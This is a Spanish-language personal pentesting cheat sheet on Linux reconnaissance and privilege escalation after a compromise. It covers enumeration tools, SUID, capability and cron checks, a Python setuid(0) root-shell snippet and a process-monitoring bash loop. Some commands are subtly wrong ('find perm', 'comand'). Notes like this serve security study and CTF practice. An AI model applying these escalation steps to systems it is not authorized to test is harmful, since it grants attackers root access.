> Una vez comprometida una maquina Linux vendria la etapa de reconocimiento.
## Herramientas
- [[lse]]
- [[linenum]]
- [[pspython]]
- [[gtobins]]
- [[Hack Tricks]]

## De forma automatica
- Con lse:
	- `./lse.sh -l 1`
	- `./lse.sh -l 3`
- Con linenum hacemos lo mismo para descargar solo el archivo .sh
	- `./linenum.sh`
- Para listar tareas que se ejecutan a intervalos constantes:
	- [pspython](https://github.com/DominicBreuker/pspy)
```bash
./pspython
```

## De forma manual
```bash
whoami
id
sudo -l
find perm -4000 2>/dev/null 
find perm -4000 -ls 2>/dev/null 
```
- Si tenemos acceso a python3.9 podemos escalar privilegios
- Ejecutamos python3.9 en la consola:
```python
import os
os.system("whoami")
os.setuid(0)
os.system("whoami")
os.system("bash")
```
- Luego con `getcap`
```bash
getcap -r / 2>/dev/null
```
- Luego para ver si ejecuta tareas cron
```bash
crontab -l
cat /etc/crontab
```
- Listar tareas
```bash
systemctl list-timers
```
- Para ver todos los comandos que se estan ejecutando
```
ps -eo comand
ps -eo user,comand
```
- Crear un bash
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n [!] Saliendo...\n"
	tput cnorm;exit
}

# control c
trap ctrl_c SIGINT

old_process=$(ps -eo user,command)

tput civis

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|kworker|procmon"
	old_process=$new_process
done
```